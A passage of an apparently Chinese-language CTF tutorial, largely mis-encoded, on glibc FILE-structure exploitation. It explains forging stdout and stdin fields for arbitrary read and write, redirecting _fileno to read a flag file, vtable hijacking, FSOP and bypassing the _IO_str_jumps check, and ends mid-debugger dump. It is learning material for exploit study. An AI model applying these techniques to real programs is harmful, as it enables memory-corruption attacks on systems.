title="__IO_2_1_stdoutæˆå‘˜å˜é‡åˆ©ç”¨"></a>__IO_2_1_stdoutæˆå‘˜å˜é‡åˆ©ç”¨</h3><p>é€šè¿‡ä¼ªé€ stdoutç»“æ„ä½“ä¸­çš„æˆå‘˜å˜é‡æ¥è¾¾æˆä»»æ„åœ°å€è¯»çš„ç›®çš„ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406091415745.png" alt="image-20240609141531616"></p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406091440957.png" alt="image-20240609144052890"></p><p>æŒŸæŒæµç¨‹ï¼šputs â€“&gt; _IO_puts â€“&gt; _IO_new_file_xsputn â€“&gt; _IO_new_file_overflow â€“&gt; _IO_do_write(FILE, __IO_write_base, size)  â€“&gt;   _IO_do_write â€“&gt; _IO_new_do_write â€“&gt;  new_do_write</p><p>å½“æˆ‘ä»¬èƒ½æ§åˆ¶__IO_2_1_stdoutä¸­çš„æˆå‘˜å˜é‡ï¼Œå°±èƒ½æŒŸæŒputsæ‰§è¡Œ_IO_do_writeï¼Œä»è€Œæ³„éœ² __IO_write_base åˆ° __IO_write_pträ¹‹é—´çš„æ•°æ®</p><h4 id="ç»•è¿‡"><a href="#ç»•è¿‡" class="headerlink" title="ç»•è¿‡"></a>ç»•è¿‡</h4><p>_IO_new_file_overflow  â€“&gt;  è®¾ç½®_flag &#x3D; 0xFBAD0800</p><blockquote><p>check1ï¼šif (f-&gt;_flags &amp; _IO_NO_WRITES)    &#x3D;&#x3D;&gt;   è®¾ç½®_flagæ ‡å¿—ä½ä¸åŒ…å«_IO_NO_WRITES ï¼ˆ8ï¼‰</p><p>check2ï¼š if ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) &#x3D;&#x3D; 0 || f-&gt;_IO_write_base &#x3D;&#x3D; NULL)  &#x2F;&#x2F;æ£€æŸ¥è¾“å‡ºç¼“å†²åŒºæ˜¯å¦ä¸ºç©º    &#x3D;&#x3D;&gt; è®¾ç½®_flagæ ‡å¿—ä½åŒ…å«_IO_CURRENTLY_PUTTING  ï¼ˆ0x800ï¼‰</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_MAGIC 0xFBAD0000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_NO_WRITES 8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_CURRENTLY_PUTTING 0x800</span></span><br><span class="line">_flags &amp; _IO_NO_WRITES = <span class="number">0</span> </span><br><span class="line">_flags = <span class="number">0xfbad0000</span></span><br><span class="line">_files &amp; _IO_CURRENTLY_PUTTING = <span class="number">1</span></span><br><span class="line">_flags = <span class="number">0xFBAD0800</span></span><br></pre></td></tr></table></figure><p>new_do_write</p><blockquote><p>æˆ‘ä»¬éœ€è¦è¿›å…¥ä»¥ä¸‹å…¶ä¸­ä¸€åˆ†æ”¯</p><p>check1ï¼šif (fp-&gt;_flags &amp; _IO_IS_APPENDING)  &#x3D;&#x3D;&gt;  è®¾ç½®_flagæ ‡å¿—ä½åŒ…å«_IO_IS_APPENDING</p><p>check2ï¼šif (fp-&gt;_IO_read_end !&#x3D; fp-&gt;_IO_write_base) &#x3D;&#x3D;&gt;  è®¾ç½®_IO_read_end &#x3D; _IO_write_baseå°±èƒ½ç»•è¿‡åˆ¤æ–­ï¼Œä½†æ˜¯å¦‚æœæˆ‘ä»¬è¦è¿›å…¥è¯¥åˆ†æ”¯éœ€è¦çš„æ„é€ ç‚¹å°±æœ‰å¾ˆå¤šäº†</p><blockquote><p> else if (fp-&gt;_IO_read_end !&#x3D; fp-&gt;_IO_write_base)  &#x2F;&#x2F;_IO_read_end &#x3D; _IO_write_base 0x1000çš„å¯¹é½æœºåˆ¶ï¼Œè¦†ç›–æœ«ä½å­—èŠ‚éš¾ä»¥æ§åˆ¶ç›¸ç­‰<br> {<br>   off64_t new_pos<br>     &#x3D; _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, 1);  &#x2F;&#x2F;è°ƒç”¨_IO_SYSSEEKï¼Œsyseekå‡½æ•°å¯èƒ½ä¼šæ‰§è¡Œä¸æˆåŠŸè€Œé€€å‡º<br>   if (new_pos &#x3D;&#x3D; _IO_pos_BAD)<br>     return 0;<br>   fp-&gt;_offset &#x3D; new_pos;<br> }</p></blockquote><p>æ‰€ä»¥æˆ‘ä»¬ä¸€èˆ¬é€‰æ‹©è¿›å…¥check1çš„åˆ†æ”¯ä¸­</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_MAGIC 0xFBAD0000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_NO_WRITES 8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_CURRENTLY_PUTTING 0x800</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_IS_APPENDING 0x1000</span></span><br><span class="line">_flags = <span class="number">0xfbad0000</span></span><br><span class="line">_files &amp; _IO_CURRENTLY_PUTTING = <span class="number">1</span></span><br><span class="line">_flags = <span class="number">0xFBAD0800</span></span><br><span class="line">_flags &amp; _IO_IS_APPENDING = <span class="number">1</span></span><br><span class="line">_flags = <span class="number">0xfbad1800</span></span><br></pre></td></tr></table></figure><p>å†å°†_IO_write_baseè®¾ç½®æˆä¸ºéœ€è¦æ³„éœ²çš„ä½ç½®ï¼Œ_IO_write_ptræŒ‡å‘æ³„éœ²ç»“æŸçš„åœ°å€ï¼Œå³å¯æ³„éœ²ä¿¡æ¯</p><p>printfè°ƒç”¨é“¾ï¼š__printf (printf.c)â€“&gt; __vfprintf_internalï¼ˆiovsprintf.cï¼Œä½ç‰ˆæœ¬ä¸ºvfprintfï¼‰ â€“&gt;  _IO_file_xsputn â€“&gt; åé¢ä¸putsè°ƒç”¨ç›¸åŒ</p><h4 id="æ¼”ç¤º"><a href="#æ¼”ç¤º" class="headerlink" title="æ¼”ç¤º"></a>æ¼”ç¤º</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a = <span class="number">11111111</span>;</span><br><span class="line"><span class="type">char</span> b[<span class="number">8</span>] = <span class="string">&quot;abcdefg&quot;</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, a);</span><br></pre></td></tr></table></figure><p>è°ƒç”¨æ ˆç¤ºä¾‹   2.31-0ubuntu9.7</p><p>è°ƒç”¨printfå‰è®¾ç½®_flagså­—æ®µä¸º 0xfbad1800 ï¼Œ_IO_write_baseä¸º&amp;bï¼Œ_IO_write_pträ¸º&amp;b+8</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406091541157.png" alt="image-20240609154157045"></p><p>è°ƒç”¨æ ˆï¼Œè¿™é‡Œä¼šæ‰“å°å‡º abcdefg</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406091545477.png" alt="image-20240609154556408"></p><h3 id="åˆ©ç”¨-fileno-å­—æ®µæ³„éœ²æ•°æ®"><a href="#åˆ©ç”¨-fileno-å­—æ®µæ³„éœ²æ•°æ®" class="headerlink" title="åˆ©ç”¨ _fileno å­—æ®µæ³„éœ²æ•°æ®"></a>åˆ©ç”¨ _fileno å­—æ®µæ³„éœ²æ•°æ®</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">int</span> _flags;<span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_read_ptr;<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">char</span> *_IO_read_end;<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_read_base;<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_write_base;<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_write_ptr;<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_write_end;<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_buf_base;<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_buf_end;<span class="comment">/* End of reserve area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> _fileno;   <span class="comment">//æ–‡ä»¶æè¿°ç¬¦</span></span><br><span class="line">  <span class="type">int</span> _flags2;</span><br><span class="line">  <span class="type">__off_t</span> _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> _cur_column;</span><br><span class="line">  <span class="type">signed</span> <span class="type">char</span> _vtable_offset;</span><br><span class="line">  <span class="type">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>é€šè¿‡ä¿®æ”¹ _fileno(_IO_FILEç»“æ„åç§»0x70å¤„) </p><p>è¿›ç¨‹ä¸­ç³»ç»Ÿé»˜è®¤åŒ…å«ä¸‰ä¸ªæ–‡ä»¶æµstdin\stdout\stderrï¼Œæ–‡ä»¶æè¿°ç¬¦0\1\2ã€‚å¦‚æœä¿®æ”¹stdinçš„_filenoå­—æ®µä¸º3ï¼Œå³å¯ä»æ–‡ä»¶æè¿°ç¬¦ä¸º3çš„æ–‡ä»¶ä¸­è¯»å–ã€‚</p><h4 id="æ¼”ç¤º-1"><a href="#æ¼”ç¤º-1" class="headerlink" title="æ¼”ç¤º"></a>æ¼”ç¤º</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> stack_buf[<span class="number">0x100</span>];</span><br><span class="line">    FILE *fp = fopen(<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;rw&quot;</span>);</span><br><span class="line">    <span class="comment">// scanf(&quot;%256s&quot;, &amp;stack_buf);</span></span><br><span class="line">    <span class="comment">// scanf(&quot;%256s&quot;, &amp;stack_buf);</span></span><br><span class="line">    fgets(stack_buf, <span class="keyword">sizeof</span>(stack_buf), <span class="built_in">stdin</span>); <span class="comment">//1</span></span><br><span class="line">    fgets(stack_buf, <span class="keyword">sizeof</span>(stack_buf), <span class="built_in">stdin</span>); <span class="comment">//2</span></span><br><span class="line">    <span class="built_in">puts</span>(stack_buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨æœªæ‰§è¡Œåˆ°1æ—¶ï¼Œstdinè¿˜æœªåˆå§‹åŒ–</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406091645363.png" alt="image-20240609164506277"></p><p>æ‰§è¡Œ1ä»¥å</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406091645172.png" alt="image-20240609164539105"></p><p>æ­¤æ—¶stdin._filenoè¢«è®¾ç½®ä¸º0ï¼Œæ‰§è¡Œ2å°†ä¼šä»æ ‡å‡†è¾“å…¥ä¸­è¯»å–</p><p>æˆ‘ä»¬è®¾ç½®stdin._filenoä¸º3ï¼Œç¬¬äºŒä¸ªfgetså°†ä¼šä»æ–‡ä»¶æè¿°ç¬¦ä¸º3çš„æ–‡ä»¶ä¸­è¯»å–ï¼Œå³è¯»å–flag</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406091658893.png" alt="image-20240609165814755"></p><h3 id="stdinä»»æ„åœ°å€å†™"><a href="#stdinä»»æ„åœ°å€å†™" class="headerlink" title="stdinä»»æ„åœ°å€å†™"></a>stdinä»»æ„åœ°å€å†™</h3><p>ä»»æ„åœ°å€å†™çš„å®é™…åˆ©ç”¨é‡åˆ°çš„å¹¶ä¸æ˜¯å¾ˆå¤šï¼Œä¸å†™åŸç†äº†ã€‚</p><h4 id="ç»•è¿‡-1"><a href="#ç»•è¿‡-1" class="headerlink" title="ç»•è¿‡"></a>ç»•è¿‡</h4><blockquote><p>è®¾ç½® _IO_read_end ç­‰äº_IO_read_ptr ã€‚<br>è®¾ç½® _flag &amp;~ _IO_NO_READS å³ _flag &amp;~ 0x4ã€‚<br>è®¾ç½® _fileno ä¸º 0 ï¼Œè¡¨ç¤ºè¯»å…¥æ•°æ®çš„æ¥æºæ˜¯ stdin ã€‚<br>è®¾ç½® _IO_buf_base ä¸º write_start ï¼Œ_IO_buf_end ä¸º write_end ï¼›ä¸”ä½¿å¾— _IO_buf_end - _IO_buf_base å¤§äº fread è¦è¯»çš„æ•°æ®</p></blockquote><h3 id="stdoutä»»æ„åœ°å€å†™"><a href="#stdoutä»»æ„åœ°å€å†™" class="headerlink" title="stdoutä»»æ„åœ°å€å†™"></a>stdoutä»»æ„åœ°å€å†™</h3><h4 id="ç»•è¿‡-2"><a href="#ç»•è¿‡-2" class="headerlink" title="ç»•è¿‡"></a>ç»•è¿‡</h4><blockquote><p>_IO_write_ptr æŒ‡å‘ write_start ï¼Œ_IO_write_end æŒ‡å‘ write_end å³å¯å®ç°åœ¨ç›®æ ‡åœ°å€å†™å…¥æ•°æ®ã€‚  &#x3D;&#x3D;&gt; å°†æ‰“å°å†…å®¹çš„å‰sizeä½å†™å…¥åˆ°äº†write_startä¸­</p></blockquote><h2 id="2-2-è™šè¡¨"><a href="#2-2-è™šè¡¨" class="headerlink" title="2.2 è™šè¡¨"></a>2.2 è™šè¡¨</h2><p>vtableæŒŸæŒï¼š1.æ”¹vtableä¸­çš„å‡½æ•°æŒ‡é’ˆï¼›2.æ”¹vtableæŒ‡é’ˆæŒ‡å‘å¯æ§å†…å­˜</p><p>vtableä¸€èˆ¬ä¸å¯æ”¹ã€‚</p><blockquote><p>IO è°ƒç”¨çš„ vtable å‡½æ•°ï¼š</p><p>fopen å‡½æ•°æ˜¯åœ¨åˆ†é…ç©ºé—´ï¼Œå»ºç«‹ FILE ç»“æ„ä½“ï¼Œæœªè°ƒç”¨ vtable ä¸­çš„å‡½æ•°ã€‚</p><p>fread å‡½æ•°ä¸­è°ƒç”¨çš„ vtable å‡½æ•°æœ‰ï¼š</p><ul><li><p>_IO_sgetn å‡½æ•°è°ƒç”¨äº† vtable çš„ _IO_file_xsgetn ã€‚</p></li><li><p>_IO_doallocbuf å‡½æ•°è°ƒç”¨äº† vtable çš„ _IO_file_doallocate ä»¥åˆå§‹åŒ–è¾“å…¥ç¼“å†²åŒºã€‚</p></li><li><p>vtable ä¸­çš„ _IO_file_doallocate è°ƒç”¨äº† vtable ä¸­çš„ __GI__IO_file_stat ä»¥è·å–æ–‡ä»¶ä¿¡æ¯ã€‚</p></li><li><p>__underflow å‡½æ•°è°ƒç”¨äº† vtable ä¸­çš„ _IO_new_file_underflow å®ç°æ–‡ä»¶æ•°æ®è¯»å–ã€‚</p></li><li><p>vtable ä¸­çš„ _IO_new_file_underflow è°ƒç”¨äº† vtable__GI__IO_file_read æœ€ç»ˆå»æ‰§è¡Œç³»ç»Ÿè°ƒç”¨readã€‚</p></li></ul><p>fwrite å‡½æ•°è°ƒç”¨çš„ vtable å‡½æ•°æœ‰ï¼š</p><ul><li><p>_IO_fwrite å‡½æ•°è°ƒç”¨äº† vtable çš„ _IO_new_file_xsputn ã€‚</p></li><li><p>_IO_new_file_xsputn å‡½æ•°è°ƒç”¨äº† vtable ä¸­çš„ _IO_new_file_overflow å®ç°ç¼“å†²åŒºçš„å»ºç«‹ä»¥åŠåˆ·æ–°ç¼“å†²åŒºã€‚</p></li><li><p>vtable ä¸­çš„ _IO_new_file_overflow å‡½æ•°è°ƒç”¨äº† vtable çš„ _IO_file_doallocate ä»¥åˆå§‹åŒ–è¾“å…¥ç¼“å†²åŒºã€‚</p></li><li><p>vtable ä¸­çš„ _IO_file_doallocate è°ƒç”¨äº† vtable ä¸­çš„ __GI__IO_file_stat ä»¥è·å–æ–‡ä»¶ä¿¡æ¯ã€‚</p></li><li><p>new_do_write ä¸­çš„ _IO_SYSWRITE è°ƒç”¨äº† vtable_IO_new_file_write æœ€ç»ˆå»æ‰§è¡Œç³»ç»Ÿè°ƒç”¨writeã€‚</p></li></ul><p>fclose å‡½æ•°è°ƒç”¨çš„ vtable å‡½æ•°æœ‰ï¼š</p><ul><li>åœ¨æ¸…ç©ºç¼“å†²åŒºçš„ _IO_do_write å‡½æ•°ä¸­ä¼šè°ƒç”¨ vtable ä¸­çš„å‡½æ•°ã€‚</li><li>å…³é—­æ–‡ä»¶æè¿°ç¬¦ _IO_SYSCLOSE å‡½æ•°ä¸º vtable ä¸­çš„ __close å‡½æ•°ã€‚</li><li>_IO_FINISH å‡½æ•°ä¸º vtable ä¸­çš„ __finish å‡½æ•°.</li></ul></blockquote><blockquote><p>1.freadå‡½æ•°è°ƒç”¨_IO_FILE_plus.vtableä¸­çš„_IO_XSGETNæŒ‡é’ˆ<br>2.fwriteå‡½æ•°è°ƒç”¨_IO_FILE_plus.vtableä¸­çš„_IO_XSPUTNæŒ‡é’ˆï¼Œ_IO_XSPUTNä¸­ä¼šè°ƒç”¨åŒæ ·ä½äº vtable ä¸­çš„_IO_OVERFLOWæŒ‡é’ˆ<br>3.fcloseå‡½æ•°è°ƒç”¨_IO_FILE_plus.vtableä¸­çš„_IO_FINISHæŒ‡é’ˆ<br>4.printf&#x2F;putsä¸fwriteå‡½æ•°è°ƒç”¨å¤§è‡´ç›¸åŒï¼Œå‡ä¼šè°ƒç”¨_IO_XSPUTNæŒ‡é’ˆå’Œ_IO_OVERFLOWæŒ‡é’ˆ</p></blockquote><p>2.24ç‰ˆæœ¬ä»¥å‰å¯ä»¥ç›´æ¥ä¼ªé€ vtableæ¥æ„é€ è™šå‡çš„è·³è¡¨è°ƒç”¨ç›®çš„å‡½æ•°ï¼Œ2.24ä»¥åæ–°å¢_IO_vtable_checkå‡½æ•°</p><p>ä¸€èˆ¬éƒ½æ˜¯ä¿®æ”¹vtableä¸­çš„æŒ‡é’ˆï¼Œç„¶åå†è§¦å‘è°ƒç”¨å³å¯å®ç°åˆ©ç”¨</p><h2 id="2-3-IO-FILE-plus-FSOP"><a href="#2-3-IO-FILE-plus-FSOP" class="headerlink" title="2.3  __IO_FILE_plus   FSOP"></a>2.3  __IO_FILE_plus   FSOP</h2><p>&lt;2.24</p><p>æŒŸæŒ_IO_list_allæŒ‡å‘ä¼ªé€ çš„__IO_FILE_plusï¼Œä¹‹åä½¿ç¨‹åºæ‰§è¡Œ_IO_flush_all_lockpå‡½æ•°ï¼Œåˆ·æ–°_IO_list_allä¸­æ‰€æœ‰é¡¹çš„æ–‡ä»¶æµï¼Œè§¦å‘_IO_overflow</p><blockquote><p>ç¨‹åºæ‰§è¡Œ _IO_flush_all_lockp å‡½æ•°æœ‰ä¸‰ç§æƒ…å†µï¼š</p><p>å½“ libc æ‰§è¡Œ abort æµç¨‹æ—¶<br>å½“æ‰§è¡Œ exit å‡½æ•°æ—¶<br>å½“æ‰§è¡Œæµä» main å‡½æ•°è¿”å›æ—¶</p></blockquote><p>æŒŸæŒæ–¹æ³•</p><blockquote><p>1.è¦†ç›– _IO_2_1_stderr_ ç»“æ„ä½“</p><p>2.åˆ©ç”¨large bin attackæ¥å°†_IO_list_allè¦†ç›–æˆä¸ºä¸€ä¸ªchunkåœ°å€ï¼Œç„¶ååœ¨chunkä¸Šä¼ªé€ ä¸€ä¸ªfake_IO_FILEç»“æ„ä½“</p></blockquote><h2 id="2-4-IO-str-jumps"><a href="#2-4-IO-str-jumps" class="headerlink" title="2.4  __IO_str_jumps"></a>2.4  __IO_str_jumps</h2><p>2.24~2.28   _IO_vtable_checkçš„å¢åŠ ï¼Œé™åˆ¶äº†ä¼ªé€ vtableæŒ‡é’ˆçš„åŒºåŸŸé™åˆ¶</p><p>å…·ä½“åˆ©ç”¨å¯ä»¥çœ‹å¯¹[hctf_2018] the_endçš„åˆ†æ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> _IO_vtable_check (<span class="type">void</span>) attribute_hidden;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *</span><br><span class="line"><span class="title function_">IO_validate_vtable</span> <span class="params">(<span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *vtable)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">uintptr_t</span> section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *ptr = (<span class="type">const</span> <span class="type">char</span> *) vtable;</span><br><span class="line">  <span class="type">uintptr_t</span> offset = ptr - __start___libc_IO_vtables;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (offset &gt;= section_length))</span><br><span class="line">    _IO_vtable_check ();</span><br><span class="line">  <span class="keyword">return</span> vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>ç»•è¿‡if (__glibc_unlikely (offset &gt;&#x3D; section_length))  â€“&gt;   __start___libc_IO_vtables&lt;   *vtable &lt; __stop___libc_IO_vtables</p><p>_IO_str_jumps ä¸ __IO_wstr_jumps å°±ä½äº __stop___libc_IO_vtables å’Œ __start___libc_IO_vtables ä¹‹é—´</p><p>å°†vtableæŒ‡å‘ _IO_str_jumps  æˆ–è€… __IO_wstr_jumps </p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p _IO_str_jumps</span><br><span class="line">$<span class="number">1</span> = &#123;</span><br><span class="line">  __dummy = <span class="number">0</span>,</span><br><span class="line">  __dummy2 = <span class="number">0</span>,</span><br><span class="line">  __finish = <span class="number">0x7ffff7a83fb0</span> &lt;_IO_str_finish&gt;,</span><br><span class="line">  __overflow = <span class="number">0x7ffff7a83c90</span> &lt;__GI__IO_str_overflow&gt;,</span><br><span class="line">  __underflow = <span class="number">0x7ffff7a83c30</span> &lt;__GI__IO_str_underflow&gt;,</span><br><span class="line">  __uflow = <span class="number">0x7ffff7a82610</span> &lt;__GI__IO_default_uflow&gt;,</span><br><span class="line">  __pbackfail = <span class="number">0x7ffff7a83f90</span> &lt;__GI__IO_str_pbackfail&gt;,</span><br><span class="line">  __xsputn = <span class="number">0x7ffff7a82640</span> &lt;__GI__IO_default_xsputn&gt;,</span><br><span class="line">  __xsgetn = <span class="number">0x7ffff7a82720</span> &lt;__GI__IO_default_xsgetn&gt;,</span><br><span class="line">  __seekoff = <span class="number">0x7ffff7a840e0</span> &lt;__GI__IO_str_seekoff&gt;,</span><br><span class="line">  __seekpos = <span class="number">0x7ffff7a82a10</span> &lt;_IO_default_seekpos&gt;,</span><br><span class="line">  __setbuf = <span class="number">0x7ffff7a82940</span> &lt;_IO_default_setbuf&gt;,</span><br><span class="line">  __sync = <span class="number">0x7ffff7a82c10</span> &lt;_IO_default_sync&gt;,</span><br><span class="line">  __doallocate = <span class="number">0x7ffff7a82a30</span> &lt;__GI__IO_default_doallocate&gt;,</span><br><span class="line">  __read = <span class="number">0x7ffff7a83ae0</span> &lt;_IO_default_read&gt;,</span><br><span class="line">  __write = <span class="number">0x7ffff7a83af0</span> &lt;_IO_default_write&gt;,</span><br><span class="line">  __seek = <span class="number">0x7ffff7a83ac0</span> &lt;_IO_default_seek&gt;,</span><br><span class="line">  __close = <span class="number">0x7ffff7a82c10</span> &lt;_IO_default_sync&gt;,</span><br><span class="line">  __stat = <span class="number">0x7ffff7a83ad0</span> &lt;_IO_default_stat&gt;,</span><br><span class="line">  __showmanyc = <span class="number">0x7ffff7a83b00</span> &lt;_IO_default_showmanyc&gt;,</span><br><span class="line">  __imbue = <span class="number">0x7ffff7a83b10</span> &lt;_IO_default_imbue&gt;</span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; p _IO_file_jumps</span><br><span class="line">$<span class="number">2</span> = &#123;</span><br><span class="line">  __dummy = <span class="number">0</span>,</span><br><span class="line">  __dummy2 = <span class="number">0</span>,</span><br><span class="line">  __finish = <span class="number">0x7ffff7a809d0</span> &lt;_IO_new_file_finish&gt;,</span><br><span class="line">  __overflow = <span class="number">0x7ffff7a81740</span> &lt;_IO_new_file_overflow&gt;,</span><br><span class="line">  __underflow = <span class="number">0x7ffff7a814b0</span> &lt;_IO_new_file_underflow&gt;,</span><br><span class="line">  __uflow = <span class="number">0x7ffff7a82610</span> &lt;__GI__IO_default_uflow&gt;,</span><br><span class="line">  __pbackfail = <span class="number">0x7ffff7a83990</span> &lt;__GI__IO_default_pbackfail&gt;,</span><br><span class="line">  __xsputn = <span class="number">0x7ffff7a801f0</span> &lt;_IO_new_file_xsputn&gt;,</span><br><span class="line">  __xsgetn = <span class="number">0x7ffff7a7fed0</span> &lt;__GI__IO_file_xsgetn&gt;,</span><br><span class="line">  __seekoff = <span class="number">0x7ffff7a7f4d0</span> &lt;_IO_new_file_seekoff&gt;,</span><br><span class="line">  __seekpos = <span class="number">0x7ffff7a82a10</span> &lt;_IO_default_seekpos&gt;,</span><br><span class="line">  __setbuf = <span class="number">0x7ffff7a7f440</span> &lt;_IO_new_file_setbuf&gt;,</span><br><span class="line">  __sync = <span class="number">0x7ffff7a7f380</span> &lt;_IO_new_file_sync&gt;,</span><br><span class="line">  __doallocate = <span class="number">0x7ffff7a74190</span> 